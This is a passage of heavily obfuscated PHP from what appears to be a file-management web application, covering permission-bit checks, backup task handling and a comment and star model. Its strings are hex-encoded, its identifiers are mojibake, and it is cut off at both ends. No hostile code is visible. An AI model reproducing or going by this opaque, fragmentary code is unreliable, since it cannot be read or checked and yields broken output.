!!($ÖÚÔôÕ & $§µ²Æ¢ò); } public static function authCheckShow($¾ˆâ‹÷Î) { return self::authCheck($¾ˆâ‹÷Î, self::AUTH_SHOW); } public static function authCheckView($’ò´–Èø) { return self::authCheck($’ò´–Èø, self::AUTH_VIEW); } public static function authCheckDownload($†Á›Úö) { return self::authCheck($†Á›Úö, self::AUTH_DOWNLOAD); } public static function authCheckUpload($” ‰Ä¸„) { return self::authCheck($” ‰Ä¸„, self::AUTH_UPLOAD); } public static function authCheckEdit($×€şá•–) { return self::authCheck($×€şá•–, self::AUTH_EDIT); } public static function authCheckRemove($”ÀşñØÎ) { return self::authCheck($”ÀşñØÎ, self::AUTH_REMOVE); } public static function authCheckShare($äÏ¡±•) { return self::authCheck($äÏ¡±•, self::AUTH_SHARE); } public static function authCheckComment($ÎÈ¸ææ) { return self::authCheck($ÎÈ¸ææ, self::AUTH_COMMENT); } public static function authCheckEvent($‹¡ŒŒ€†) { return self::authCheck($‹¡ŒŒ€†, self::AUTH_EVENT); } public static function authCheckRoot($÷²À§®…) { return self::authCheck($÷²À§®…, self::AUTH_ROOT); } public static function authCheckAction($—Ù§£ş, $§àÃ˜à‘) { $¢Ï¯°şÂ =& $_SERVER[ Ö‘ñÄ”]; $Ÿå§È… = array($¢Ï¯°şÂ[1856] => self::AUTH_VIEW, $¢Ï¯°şÂ[1205] => self::AUTH_DOWNLOAD, $¢Ï¯°şÂ[107] => self::AUTH_UPLOAD, $¢Ï¯°şÂ[1806] => self::AUTH_EDIT, $¢Ï¯°şÂ[1805] => self::AUTH_REMOVE, $¢Ï¯°şÂ[1816] => self::AUTH_SHARE, $¢Ï¯°şÂ[363] => self::AUTH_COMMENT, $¢Ï¯°şÂ[1651] => self::AUTH_EVENT, $¢Ï¯°şÂ[1857] => self::AUTH_ROOT); if (!isset($Ÿå§È…[$§àÃ˜à‘])) { return; } $ç±‰Í¯¥ = $Ÿå§È…[$§àÃ˜à‘]; $—Ù§£ş = intval($—Ù§£ş); if ($—Ù§£ş <= 0) { return !1; } if (($—Ù§£ş & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($—Ù§£ş & $ç±‰Í¯¥); } public static function authDisable($ß¨×’™, $’­øˆÆĞ) { if (intval($ß¨×’™) <= 0) { return 0; } return intval($ß¨×’™) & ~$’­øˆÆĞ; } public $optionType = "\x53\x79\163\164\145\x6d\56\163\157\165\x72\x63\x65\x41\165\164\x68\114\151\163\x74"; public $field = array("\156\141\x6d\145", "\141\x75\x74\x68", "\154\141\x62\x65\154", "\144\151\163\160\154\x61\x79", "\x73\171\163\x74\x65\x6d", "\163\157\162\164"); public function initData() { $š¿ÃÚ·Ê = $this->authDefault(); foreach ($š¿ÃÚ·Ê as $‹Ì²‰¦Ô) { $this->add($‹Ì²‰¦Ô); } } public function findAuth($»¦À»£, $œ’Û) { $´†ûœ·á =& $_SERVER[ Ö‘ñÄ”]; $‘±Îê¥ = parent::listData(); foreach ($‘±Îê¥ as $ñé¯ô¶) { $Ò®´³® = intval($ñé¯ô¶[$´†ûœ·á[421]]); if ($Ò®´³® <= 0 || $ñé¯ô¶[$´†ûœ·á[1858]] == 0) { continue; } if (($Ò®´³® & $»¦À»£) != $»¦À»£) { continue; } if (($Ò®´³® & $œ’Û) != 0) { continue; } return $ñé¯ô¶[$´†ûœ·á[407]]; } return !1; } public function findAuthReadOnly() { $»ıÌ§† = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $îàÃğÌ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($»ıÌ§†, $îàÃğÌ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $«»ÄàÅ¹ =& $_SERVER[ Ö‘ñÄ”]; $Éú¢«¥ = parent::listData(); $Ã…‹«ï = !1; foreach ($Éú¢«¥ as $È¶³ÂÀì) { if ($È¶³ÂÀì[$«»ÄàÅ¹[421]] <= 0 || $È¶³ÂÀì[$«»ÄàÅ¹[1858]] == $«»ÄàÅ¹[197]) { continue; } if (!$Ã…‹«ï) { $Ã…‹«ï = $È¶³ÂÀì; continue; } if ($Ã…‹«ï[$«»ÄàÅ¹[421]] > $È¶³ÂÀì[$«»ÄàÅ¹[421]]) { $Ã…‹«ï = $È¶³ÂÀì; } } return $Ã…‹«ï ? $Ã…‹«ï[$«»ÄàÅ¹[407]] : $«»ÄàÅ¹[12]; } public function listData($ØïïÛ = false, $»ÙÆù©° = "\163\157\x72\164", $£ºÕß¯€ = false) { return parent::listData($ØïïÛ, $»ÙÆù©°, $£ºÕß¯€); } public function update($§ÔÎ¨ûµ, $ìëß³¾Ì) { $µ¬àî§· =& $_SERVER[ Ö‘ñÄ”]; $ª¨¸£±— = parent::listData($§ÔÎ¨ûµ); $ì÷ÇÛ¬¸ = $this->findByName($ìëß³¾Ì[$µ¬àî§·[32]]); if (!$ª¨¸£±— || $ì÷ÇÛ¬¸ && $ì÷ÇÛ¬¸[$µ¬àî§·[407]] != $ª¨¸£±—[$µ¬àî§·[407]]) { return !1; } $this->filterAuth($ìëß³¾Ì[$µ¬àî§·[421]]); return parent::update($§ÔÎ¨ûµ, $ìëß³¾Ì); } public function remove($ÎŠìÈ) { $Ë•˜‘½Ê = parent::listData($ÎŠìÈ); if (!$Ë•˜‘½Ê || $Ë•˜‘½Ê[$_SERVER[ Ö‘ñÄ”][1282]]) { return !1; } return parent::remove($ÎŠìÈ); } public function add($ÈÆù‡Å = array()) { $–ü—ŠºÁ =& $_SERVER[ Ö‘ñÄ”]; if ($this->findByName($ÈÆù‡Å[$–ü—ŠºÁ[32]])) { return !1; } $ÏÎ¸¸ÌÂ = array($–ü—ŠºÁ[32] => $–ü—ŠºÁ[12], $–ü—ŠºÁ[421] => 1, $–ü—ŠºÁ[1859] => $–ü—ŠºÁ[1846], $–ü—ŠºÁ[1858] => 1, $–ü—ŠºÁ[1282] => 0, $–ü—ŠºÁ[1860] => 0); $ÈÆù‡Å = array_merge($ÏÎ¸¸ÌÂ, $ÈÆù‡Å); $ÈÆù‡Å[$–ü—ŠºÁ[1860]] = $this->getSort(); $this->filterAuth($ÈÆù‡Å[$–ü—ŠºÁ[421]]); return parent::insert($ÈÆù‡Å); } private function getSort() { $€µò‡æì =& $_SERVER[ Ö‘ñÄ”]; $’Í¤é“ = parent::listData(); $×¶„§«å = array_to_keyvalue($’Í¤é“, $€µò‡æì[12], $€µò‡æì[1860]); return empty($×¶„§«å) ? 0 : max($×¶„§«å) + 1; } private function filterAuth(&$˜ô‡½—¤) { if (!$˜ô‡½—¤) { return; } $‹´âí = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ú÷Îê‹Ê = array(); foreach ($‹´âí as $¦ÍµØ) { if ($˜ô‡½—¤ & $¦ÍµØ) { $Ú÷Îê‹Ê[] = $¦ÍµØ; } } if (in_array(self::AUTH_ROOT, $Ú÷Îê‹Ê)) { $˜ô‡½—¤ = array_sum($‹´âí); return; } $û•æç¶ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ú÷Îê‹Ê as $¦ÍµØ) { if (isset($û•æç¶[$¦ÍµØ])) { $Ú÷Îê‹Ê = array_merge($Ú÷Îê‹Ê, $û•æç¶[$¦ÍµØ]); } } $Ú÷Îê‹Ê[] = self::AUTH_SHOW; $˜ô‡½—¤ = array_sum(array_unique($Ú÷Îê‹Ê)); } public function sort($ûÙìİï‰, $Ğù—‰ŒÒ) { return parent::update($ûÙìİï‰, $Ğù—‰ŒÒ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\142\x61\143\153\165\160\114\x69\163\x74"; public $field = array("\151\x6f", "\156\x61\x6d\145", "\x73\x74\141\164\x75\163", "\143\157\156\x74\145\x6e\x74", "\155\141\x6e\165\x61\x6c", "\162\x65\163\165\154\x74", "\x74\x69\155\145\106\x72\x6f\x6d", "\x74\x69\155\145\x54\157"); public function config() { $ï¹ˆØµÜ =& $_SERVER[ Ö‘ñÄ”]; $ Ã€‘ˆ“ = Model($ï¹ˆØµÜ[783])->get($ï¹ˆØµÜ[793]); $ Ã€‘ˆ“ = json_decode($ Ã€‘ˆ“, !0); $ Ã€‘ˆ“ = is_array($ Ã€‘ˆ“) ? $ Ã€‘ˆ“ : array(); if (!isset($ Ã€‘ˆ“[$ï¹ˆØµÜ[768]])) { $ Ã€‘ˆ“[$ï¹ˆØµÜ[768]] = $ï¹ˆØµÜ[88]; } unset($ Ã€‘ˆ“[$ï¹ˆØµÜ[1633]]); Action($ï¹ˆØµÜ[1861])->taskInit(); Model($ï¹ˆØµÜ[1632])->cacheClear(); $êò·£¸ = $ï¹ˆØµÜ[1862]; $×óı—” = Model($ï¹ˆØµÜ[1863])->findByKey($ï¹ˆØµÜ[1651], $êò·£¸); if (!$×óı—”) { $×óı—” = array(); } if (isset($×óı—”[$ï¹ˆØµÜ[203]])) { $×óı—”[$ï¹ˆØµÜ[203]] = json_decode($×óı—”[$ï¹ˆØµÜ[203]], !0); } if (isset($ Ã€‘ˆ“[$ï¹ˆØµÜ[203]])) { $×óı—”[$ï¹ˆØµÜ[203]][$ï¹ˆØµÜ[1636]] = $ Ã€‘ˆ“[$ï¹ˆØµÜ[203]]; unset($ Ã€‘ˆ“[$ï¹ˆØµÜ[203]]); } return array_merge($×óı—”, $ Ã€‘ˆ“); } public function listData($Ïà¶êö = false, $Ã¢…×•­ = "\155\x6f\144\x69\x66\171\x54\x69\x6d\x65", $Öì¶—¡ş = false) { return parent::listData($Ïà¶êö, $Ã¢…×•­, !0); } public function lastItem() { $Ì°Š¬Ø = $this->listData(); return !empty($Ì°Š¬Ø[0]) ? $Ì°Š¬Ø[0] : null; } public function kill($óéë¤ĞÜ) { $ÌÅ¬è¼Ã =& $_SERVER[ Ö‘ñÄ”]; $æ‹ü¤ºö = $this->listData($óéë¤ĞÜ); if (!$æ‹ü¤ºö || empty($æ‹ü¤ºö[$ÌÅ¬è¼Ã[32]])) { return !0; } Task::kill($ÌÅ¬è¼Ã[792]); Task::kill($ÌÅ¬è¼Ã[813]); Task::kill($ÌÅ¬è¼Ã[822]); $÷˜ó®°À = $æ‹ü¤ºö[$ÌÅ¬è¼Ã[32]]; $“°üíõ› = TEMP_FILES . $ÌÅ¬è¼Ã[791] . $÷˜ó®°À . $ÌÅ¬è¼Ã[8]; IO::remove($“°üíõ›, !1); return $this->remove($óéë¤ĞÜ); } public function remove($ºšô æ©) { $°„€ÕîŸ = $this->listData($ºšô æ©); if (!$°„€ÕîŸ) { return !0; } return $this->backupRemove($°„€ÕîŸ); } private function backupRemove($…ÓªãÇ„) { parent::remove($…ÓªãÇ„[$_SERVER[ Ö‘ñÄ”][407]]); $ÛÏÚÛÏ = $this->backupPath($…ÓªãÇ„); IO::remove($ÛÏÚÛÏ, !1); return !0; } private function backupPath($“ğìº½ì) { $íÇáÛ§ =& $_SERVER[ Ö‘ñÄ”]; $ÖÍ‹€âœ = $“ğìº½ì[$íÇáÛ§[32]]; $ğ²¹ï‚Ç = Model($íÇáÛ§[783])->get($íÇáÛ§[784]); $ËÙÒ¦¥ = substr(md5($íÇáÛ§[785] . $ğ²¹ï‚Ç . $ÖÍ‹€âœ), 0, 8); return "\x7b\x69\157\72{$“ğìº½ì[$íÇáÛ§[765]]}\175\57\x64\x61\164\x61\x62\141\163\145\57\142\141\143\x6b\x75\160\57" . $ÖÍ‹€âœ . $íÇáÛ§[11] . $ËÙÒ¦¥; } public function start() { $”„¦´Âª =& $_SERVER[ Ö‘ñÄ”]; if ($GLOBALS[$”„¦´Âª[6]][$”„¦´Âª[89]][$”„¦´Âª[1864]] != $”„¦´Âª[88]) { return !0; } $§ªµ¦Ç = $this->config(); if (!$§ªµ¦Ç || $§ªµ¦Ç[$”„¦´Âª[1633]] != $”„¦´Âª[88]) { return !1; } $èÁÌÖÒş = $this->process(); foreach ($èÁÌÖÒş as $ÎÃ‡‘ÅÜ) { if ($ÎÃ‡‘ÅÜ) { return Task::restart($ÎÃ‡‘ÅÜ[$”„¦´Âª[407]]); } } $à•‡ã = new Backup(); $ÉĞ³×ã· = $à•‡ã->db(); if ($ÉĞ³×ã·) { $ÉĞ³×ã· = $à•‡ã->dbFile(); if ($ÉĞ³×ã· && $§ªµ¦Ç[$”„¦´Âª[768]] == $”„¦´Âª[197]) { $ÉĞ³×ã· = $à•‡ã->file(); } } Backup::set(array($”„¦´Âª[763] => 1, $”„¦´Âª[505] => time())); return !0; } public function process() { $âñ†¬ =& $_SERVER[ Ö‘ñÄ”]; $ğÚ˜à““ = array($âñ†¬[771] => Task::get($âñ†¬[792]), $âñ†¬[775] => Task::get($âñ†¬[813]), $âñ†¬[199] => Task::get($âñ†¬[822])); $ùÆë¸Š = !1; foreach ($ğÚ˜à““ as &$‚˜ºëòƒ) { if ($ùÆë¸Š) { $‚˜ºëòƒ = !1; continue; } if ($‚˜ºëòƒ) { $¥åÚá¬œ = intval(_get($‚˜ºëòƒ, $âñ†¬[1668], 0)); if (time() - $¥åÚá¬œ > 7200) { Task::kill($‚˜ºëòƒ[$âñ†¬[407]]); $ùÆë¸Š = !0; $‚˜ºëòƒ = !1; } } } return $ğÚ˜à““; } public function restore() { $ØÓğ—à‰ =& $_SERVER[ Ö‘ñÄ”]; ActionCall($ØÓğ—à‰[1066], !0, 1); ActionCall($ØÓğ—à‰[1066], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\x74"; protected $tableMeta = array("\164\x61\142\154\145\116\141\x6d\145" => "\143\x6f\155\155\x65\x6e\164\x5f\155\x65\164\141", "\155\145\x74\141\106\x69\145\x6c\144" => "\143\157\155\155\145\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ïÁ’èŠ) { $˜›•ÏØË =& $_SERVER[ Ö‘ñÄ”]; if ($ïÁ’èŠ[$˜›•ÏØË[1865]]) { $—Ğ•´‰Œ = $this->where(array($˜›•ÏØË[1866] => $ïÁ’èŠ[$˜›•ÏØË[1865]]))->find(); if (!$—Ğ•´‰Œ || $—Ğ•´‰Œ[$˜›•ÏØË[419]] != $ïÁ’èŠ[$˜›•ÏØË[419]] || $—Ğ•´‰Œ[$˜›•ÏØË[513]] != $ïÁ’èŠ[$˜›•ÏØË[513]]) { return !1; } $this->where(array($˜›•ÏØË[1866] => $ïÁ’èŠ[$˜›•ÏØË[1865]]))->setAdd($˜›•ÏØË[1867], 1); } $ïÁ’èŠ[$˜›•ÏØË[1868]] = 0; $ïÁ’èŠ[$˜›•ÏØË[1867]] = 0; $ïÁ’èŠ[$˜›•ÏØË[763]] = 1; return $this->add($ïÁ’èŠ); } public function commentCount($ŸÙü›Á‡, $ªµ¼è¹À, $ÌÜäğ— = false) { $¸¬åÍ =& $_SERVER[ Ö‘ñÄ”]; if (!$ŸÙü›Á‡) { return array(); } if (is_string($ŸÙü›Á‡) || is_int($ŸÙü›Á‡)) { $ŸÙü›Á‡ = array($ŸÙü›Á‡); } $î¤»òğ = array($¸¬åÍ[513], $¸¬åÍ[1869] => $¸¬åÍ[508]); $‰¦©ª° = array($¸¬åÍ[513] => array($¸¬åÍ[7], $ŸÙü›Á‡), $¸¬åÍ[419] => $ªµ¼è¹À); if ($ÌÜäğ—) { $‰¦©ª°[$¸¬åÍ[1663]] = $ÌÜäğ—; } $øŠ‰Á£» = $this->field($î¤»òğ)->where($‰¦©ª°)->group($¸¬åÍ[513])->select(); return array_to_keyvalue($øŠ‰Á£», $¸¬åÍ[513], $¸¬åÍ[508]); } public function starTarget($æñæÏ½Ñ, $ï™ÜØ—) { $°ÁÛÈ¥ =& $_SERVER[ Ö‘ñÄ”]; $ŞØâ¸ê = $æñæÏ½Ñ + self::TYPE_STAR_OFFSET; $·ŸÍü¥‡ = array($°ÁÛÈ¥[1663] => USER_ID, $°ÁÛÈ¥[419] => $ŞØâ¸ê, $°ÁÛÈ¥[513] => $ï™ÜØ—); $ÏØèÑàƒ = $this->where($·ŸÍü¥‡)->find(); if ($ÏØèÑàƒ) { return $this->where(array($°ÁÛÈ¥[407] => $ÏØèÑàƒ[$°ÁÛÈ¥[407]]))->delete(); } $Ó¨şĞ¥¦ = array($°ÁÛÈ¥[1865] => 0, $°ÁÛÈ¥[1663] => USER_ID, $°ÁÛÈ¥[763] => 1, $°ÁÛÈ¥[768] => $°ÁÛÈ¥[12], $°ÁÛÈ¥[419] => $ŞØâ¸ê, $°ÁÛÈ¥[513] => $ï™ÜØ—, $°ÁÛÈ¥[1868] => 0, $°ÁÛÈ¥[1867] => 0); return $this->add($Ó¨şĞ¥¦); } public function starTargetCount($¹ğÉíãØ, $¶ñóõàÎ) { $’ñòû‰À =& $_SERVER[ Ö‘ñÄ”]; $ùø­º¦š = $¶ñóõàÎ + self::TYPE_STAR_OFFSET; $ß‡î‰ş = $this->commentCount($¹ğÉíãØ, $ùø­º¦š); $Æ¡›‚Æ = $this->commentCount($¹ğÉíãØ, $ùø­º¦š, USER_ID); return array($’ñòû‰À[1870] => $ß‡î‰ş, $’ñòû‰À[1871] => $Æ¡›‚Æ); } public function starTargetUserList($Ã°Ò¼é·, $¿·öéñ­) { $Ôª“¾ë† =& $_SERVER[ Ö‘ñÄ”]; $‹Ğ‘çû = $Ã°Ò¼é· + self::TYPE_STAR_OFFSET; $¤È¬ºÚ« = array($Ôª“¾ë†[513] => $¿·öéñ­, $Ôª“¾ë†[419] => $‹Ğ‘çû); $Í¿¸Æ¿¬ = $this->where($¤È¬ºÚ«)->count(); $İûÁ’à = array($Ôª“¾ë†[264] => $Í¿¸Æ¿¬, $Ôª“¾ë†[1872] => array()); if (!$Í¿¸Æ¿¬) { return $İûÁ’à; } $Ç™—–Ñº = $this->field($Ôª“¾ë†[1663])->where($¤È¬ºÚ«)->limit(500)->select(); $Ç™—–Ñº = array_to_keyvalue($Ç™—–Ñº, $Ôª“¾ë†[12], $Ôª“¾ë†[1663]); $İûÁ’à[$Ôª“¾ë†[1872]] = Model($Ôª“¾ë†[521])->userListInfo($Ç™—–Ñº); return $İûÁ’à; } public function prasiseUserList($…âù“ú™) { $İòÇ‘º¥ =& $_SERVER[ Ö‘ñÄ”]; $ŸŒ‹§µ£ = array($İòÇ‘º¥[1873] => $…âù“ú™); $ÚÏ…æœ = $this->where($ŸŒ‹§µ£)->find(); $¬è´’ş£ = _get($ÚÏ…æœ, $İòÇ‘º¥[1868], 0); $­ü¤¹ÁÅ = array($İòÇ‘º¥[264] => $¬è´’ş£, $İòÇ‘º¥[1872] => array()); if (!$¬è´’ş£) { return $­ü¤¹ÁÅ; } $‚ÔÔü²² = Model($İòÇ‘º¥[1874])->field($İòÇ‘º¥[1663])->where($ŸŒ‹§µ£)->limit(500)->select(); $‚ÔÔü²² = array_to_keyvalue($‚ÔÔü²², $İòÇ‘º¥[12], $İòÇ‘º¥[1663]); $­ü¤¹ÁÅ[$İòÇ‘º¥[1872]] = Model($İòÇ‘º¥[521])->userListInfo($‚ÔÔü²²); return $­ü¤¹ÁÅ; } public function remove($Ÿ‘ş¶) { $ËÒ”øß =& $_SERVER[ Ö‘ñÄ”]; $Ø›Ù´º× = array($ËÒ”øß[1866] => $Ÿ‘ş¶); $‡ã™‰±¬ = $this->where($Ø›Ù´º×)->find(); if ($‡ã™‰±¬[$ËÒ”øß[1865]]) { $this->where(array($ËÒ”øß[1866] => $‡ã™‰±¬[$ËÒ”øß[1865]]))->setAdd($ËÒ”øß[1867], -1); } return $this->where($Ø›Ù´º×)->delete(); } public function edit($üÚƒô´à, $†ÎıÈö) { $»–ÇõÜ‡ =& $_SERVER[ Ö‘ñÄ”]; $å³× ö = array($»–ÇõÜ‡[1866] => $üÚƒô´à); return $this->where($å³× ö)->save(array($»–ÇõÜ‡[1875] => $†ÎıÈö)); } public function prasise($ó÷²¨†í) { $éŒâ¸µ =& $_SERVER[ Ö‘ñÄ”]; $øò€ğ¿ü = Model($éŒâ¸µ[1876]); $¯ËÑÇ´Â = array($éŒâ¸µ[1866] => $ó÷²¨†í, $éŒâ¸µ[1654] => USER_ID); $•€—¦ğ– = $øò€ğ¿ü->where($¯ËÑÇ´Â)->find(); if (!$•€—¦ğ–) { $øò€ğ¿ü->add($¯ËÑÇ´Â); $ıÖ«Æ£İ = $this->where(array($éŒâ¸µ[1866] => $ó÷²¨†í))->setAdd($éŒâ¸µ[1868], 1); } else { $øò€ğ¿ü->where($¯ËÑÇ´Â)->delete(); $ıÖ«Æ£İ = $this->where(array($éŒâ¸µ[1866] => $ó÷²¨†í))->setAdd($éŒâ¸µ[1868], -1); } return $ıÖ«Æ£İ; } public function targetInfo($–„ÎâÓì, $¶æìçà…) { $îÙŠæ =& $_SERVER[ Ö‘ñÄ”]; $£¹½çÈî = array($îÙŠæ[594] => $–„ÎâÓì, $îÙŠæ[595] => $¶æìçà…); $“Äı†ØŠ = $this->where($£¹½çÈî)->count(); $–™ü£ = "\122\x49\107\110\x54\40\112\117\x49\116\x20{$this->tablePrefix}\x63\157\155\x6d\x65\156\x74\x5f\x70\x72\x61\151\163\145\40\x73\x74\141\162\40\x6f\x6e\40\143\157\155\x6d\145\x6e\164\56\x63\157\x6d\155\145\x6e\164\x49\x44\40\x3d\40\x73\x74\141\162\56\143\x6f\x6d\155\x65\156\164\111\104"; $ŞÀè˜¨· = $this->alias($îÙŠæ[363])->where($£¹½çÈî)->join($–™ü£, $îÙŠæ[1877])->count(); $™ À…Ã = array($îÙŠæ[1878] => $“Äı†ØŠ, $îÙŠæ[1879] => $ŞÀè˜¨·); return $™ À…Ã; } public function listData($¾™È†‹‚) { $£³ê¡¯ =& $_SERVER[ Ö‘ñÄ”]; if (isset($¾™È†‹‚[$£³ê¡¯[1880]])) { if ($¾™È†‹‚[$£³ê¡¯[1880]]) { $¾™È†‹‚[$£³ê¡¯[1873]] = array($£³ê¡¯[1020], intval($¾™È†‹‚[$£³ê¡¯[1880]])); } unset($¾™È†‹‚[$£³ê¡¯[1880]]); } if (isset($¾™È†‹‚[$£³ê¡¯[1881]])) { if ($¾™È†‹‚[$£³ê¡¯[1881]]) { $¾™È†‹‚[$£³ê¡¯[1873]] = array($£³ê¡¯[1017], intval($¾™È†‹‚[$£³ê¡¯[1881]])); } unset($¾™È†‹‚[$£³ê¡¯[1881]]); } return $this->_listData($¾™È†‹‚); } private function _listData($‘¤İ) { $øÂºé—ë =& $_SERVER[ Ö‘ñÄ”]; $øàµõ¢ = $this->where($‘¤İ)->_makeOrder()->selectPage(100); $this->_listAppendParent($øàµõ¢[$øÂºé—ë[378]]); $this->_listAppendUser($øàµõ¢[$øÂºé—ë[378]]); $this->_listAppendMeta($øàµõ¢[$øÂºé—ë[378]]); return $øàµõ¢; } private function _makeOrder() { $¼´¶ªÏ¡ =& $_SERVER[ Ö‘ñÄ”]; $…æÑ¬©Ê = array($¼´¶ªÏ¡[1868], $¼´¶ªÏ¡[1867], $¼´¶ªÏ¡[200]); $„ šË  = Input::get($¼´¶ªÏ¡[465], $¼´¶ªÏ¡[7], $¼´¶ªÏ¡[431], $…æÑ¬©Ê); $áĞ «—¯ = Input::get($¼´¶ªÏ¡[466], $¼´¶ªÏ¡[7], $¼´¶ªÏ¡[1656], array($¼´¶ªÏ¡[1882], $¼´¶ªÏ¡[461])); $‡üº¯ŠŠ = $„ šË  . $¼´¶ªÏ¡[53] . $áĞ «—¯; return $this->order($‡üº¯ŠŠ); } private function _listAppendParent(&$‘Ü˜ô¹) { $¬“¤ãâû =& $_SERVER[ Ö‘ñÄ”]; $¯óíí®û = array_unique(array_to_keyvalue($‘Ü˜ô¹, $¬“¤ãâû[12], $¬“¤ãâû[1865])); $¯óíí®û = array_remove_value($¯óíí®û, $¬“¤ãâû[197]); if (!$¯óíí®û) { return; } $ïßù’‰Í = $this->where(array($¬“¤ãâû[1866] => array($¬“¤ãâû[7], $¯óíí®û)))->select(); $ïßù’‰Í = array_to_keyvalue($ïßù’‰Í, $¬“¤ãâû[1873]); foreach ($‘Ü˜ô¹ as &$“ÀÌŒ´) { if (isset($ïßù’‰Í[$“ÀÌŒ´[$¬“¤ãâû[1865]]])) { $“ÀÌŒ´[$¬“¤ãâû[1883]] = $ïßù’‰Í[$“ÀÌŒ´[$¬“¤ãâû[1865]]]; } } unset($“ÀÌŒ´); } private function _listAppendUser(&$¶§ÀÂÙï) { $ÌÈÉà‘Ü =& $_SERVER[ Ö‘ñÄ”]; $“±¯—é¬ = array_unique(array_to_keyvalue($¶§ÀÂÙï, $ÌÈÉà‘Ü[12], $ÌÈÉà‘Ü[1663])); $“±¯—é¬ = array_remove_value($“±¯—é¬, $ÌÈÉà‘Ü[197]); if (count($“±¯—é¬) == 0) { return; } foreach ($¶§ÀÂÙï as $º˜çÏê) { if (isset($º˜çÏê[$ÌÈÉà‘Ü[1883]])) { $“±¯—é¬[] = $º˜çÏê[$ÌÈÉà‘Ü[1883]][$ÌÈÉà‘Ü[1663]]; } } $“Àì¤Ü = Model($ÌÈÉà‘Ü[543])->userListInfo($“±¯—é¬); foreach ($¶§ÀÂÙï as &$º˜çÏê) { $º˜çÏê[$ÌÈÉà‘Ü[608]] = $“Àì¤Ü[$º˜çÏê[$ÌÈÉà‘Ü[1663]]]; if (isset($º˜çÏê[$ÌÈÉà‘Ü[1883]])) { $º˜çÏê[$ÌÈÉà‘Ü[1883]][$ÌÈÉà‘Ü[608]] = $“Àì¤Ü[$º˜çÏê[$ÌÈÉà‘Ü[1883]][$ÌÈÉà‘Ü[1663]]]; } } unset($º˜çÏê); } private function _listAppendMeta(&$Ó‰è­”) { $ˆ‹ôÏ  =& $_SERVER[ Ö‘ñÄ”]; $©ãàÃ¢Ó = array_unique(array_to_keyvalue($Ó‰è­”, $ˆ‹ôÏ [12], $ˆ‹ôÏ [1873])); $©ãàÃ¢Ó = array_remove_value($©ãàÃ¢Ó, $ˆ‹ôÏ [197]); if (!$©ãàÃ¢Ó) { return; } foreach ($Ó‰è­” as $Ö¤µ›¨œ) { if (isset($Ö¤µ›¨œ[$ˆ‹ôÏ [1883]])) { $©ãàÃ¢Ó[] = $Ö¤µ›¨œ[$ˆ‹ôÏ [1883]][$ˆ‹ôÏ [1873]]; } } $€–âÅóã = $this->metaList($©ãàÃ¢Ó); if (!$€–âÅóã) { return !1; } foreach ($Ó‰è­” as &$Ö¤µ›¨œ) { $Ö¤µ›¨œ[$ˆ‹ôÏ [474]] = $€–âÅóã[$Ö¤µ›¨œ[$ˆ‹ôÏ [1873]]]; if (isset($Ö¤µ›¨œ[$ˆ‹ôÏ [1883]])) { $Ö¤µ›¨œ[$ˆ‹ôÏ [1883]][$ˆ‹ôÏ [474]] = $€–âÅóã[$Ö¤µ›¨œ[$ˆ‹ôÏ [1883]][$ˆ‹ôÏ [1873]]]; } } unset($Ö¤µ›¨œ); } private function metaList($¢š‹ğÊò) { $µÈçÇ =& $_SERVER[ Ö‘ñÄ”]; if (!$¢š‹ğÊò) { return array(); } $Å‰ÙŸë¢ = array($µÈçÇ[1873] => array($µÈçÇ[7], $¢š‹ğÊò)); $ê½‹»äª = Model($µÈçÇ[1884])->where($Å‰ÙŸë¢)->select(); $ê½‹»äª = array_to_keyvalue_group($ê½‹»äª, $µÈçÇ[1873]); foreach ($ê½‹»äª as $œµĞí‘ä => $ßîû†„¯) { $ò×ÍÁÁğ = array(); foreach ($ßîû†„¯ as $˜şŞß’à) { $ò×ÍÁÁğ[$˜şŞß’à[$µÈçÇ[94]]] = $˜şŞß’à[$µÈçÇ[383]]; } $ê½‹»äª[$œµĞí‘ä] = $ò×ÍÁÁğ; } return $ê½‹»äª ? $ê½‹»äª : array(); } } goto e‰ùÌ…Æ­á; e£˜í‰ È: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($‚º¯µœş) { $ƒ­Îİ‹¯ =& $_SERVER[ Ö‘ñÄ”]; return array($ƒ­Îİ‹¯[1945] => array($‚º¯µœş[0], $ƒ­Îİ‹¯[1946]), $ƒ­Îİ‹¯[1947] => array($‚º¯µœş[0], $ƒ­Îİ‹¯[1948])); } protected function get($£¥×¸) { $åÆ…è² =& $_SERVER[ Ö‘ñÄ”]; $ŸÑÖ»ã¡ = Model($åÆ…è²[530])->metaGet($£¥×¸, $åÆ…è²[1949]); $£§Ù±“¦ = json_decode($ŸÑÖ»ã¡, !0); return $£§Ù±“¦ ? $£§Ù±“¦ : array($åÆ…è²[1950] => $åÆ…è²[88], $åÆ…è²[378] => array()); } protected function set($Ÿô÷¶Á†, $ñôÁßÈø) { $¹‹âé­  =& $_SERVER[ Ö‘ñÄ”]; $ñôÁßÈø = $ñôÁßÈø ? $ñôÁßÈø : array($¹‹âé­ [1950] => $¹‹âé­ [88], $¹‹âé­ [378] => array()); return Model($¹‹âé­ [530])->metaSet($Ÿô÷¶Á†, $¹‹âé­ [1949], json_encode($ñôÁßÈø)); } protected function 